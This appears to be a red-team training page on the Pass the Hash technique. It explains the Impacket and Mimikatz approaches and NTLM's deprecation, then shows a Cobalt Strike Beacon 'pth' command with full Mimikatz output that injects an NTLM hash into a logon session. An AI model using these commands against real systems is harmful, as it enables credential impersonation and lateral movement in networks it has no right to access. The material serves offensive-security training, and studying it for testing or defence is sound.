_Pass the Hash_ (often shortened to PtH) is a technique [T1550.002](https://attack.mitre.org/techniques/T1550/002/) that allows an adversary to leverage an NTLM hash for user impersonation.  There are two flavours of PtH that are often used interchangeably.

The first is implemented in Linux-based tools, like [Impacket](https://github.com/fortra/impacket), which uses raw NTLM authentication for protocols like SMB.  The second is implemented in Windows-based tools, like Mimikatz, which patches the hash directly into the credential cache of a logon session.  Both of these approaches have historically worked well because the adversary isn't required to recover the plaintext credentials through cracking, and NTLM was the default authentication protocol in Windows for a long time.

However, Microsoft are doing their utmost to remove NTLM from Windows altogether.  Kerberos has already replaced NTLM as the default authentication protocol, so seeing NTLM authentication is becoming more and more anomalous; and NTLM authentication may be [restricted](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain) in hardened environments.

---

Beacon has a built-in `pth` command - the syntax is simply `pth [DOMAIN\user] [hash]`.  This is a wrapper around `sekurlsa::pth`.  It will echo some random data into a named pipe, which Beacon will then [impersonate](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient) to assume the identity of the passed credentials.

```powershell
beacon> pth CONTOSO\rsteel fc525c9683e8fe067095ba2ddc971889
[*] Tasked beacon to run mimikatz's sekurlsa::pth /user:"rsteel" /domain:"CONTOSO" /ntlm:fc525c9683e8fe067095ba2ddc971889 /run:"%COMSPEC% /c echo 8d3f86487c1 > \\.\pipe\f08610" command

user	: rsteel
domain	: CONTOSO
program	: C:\Windows\system32\cmd.exe /c echo 8d3f86487c1 > \\.\pipe\f08610
impers.	: no
NTLM	: fc525c9683e8fe067095ba2ddc971889
  |  PID  2920
  |  TID  3716
  |  LSA Process is now R/W
  |  LUID 0 ; 18729858 (00000000:011dcb82)
  \_ msv1_0   - data copy @ 000001F7FB8EA9D0 : OK !
  \_ kerberos - data copy @ 000001F7FB8FCD28
   \_ des_cbc_md4       -> null             
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 000001F7FB8D77A8 (32) -> null
```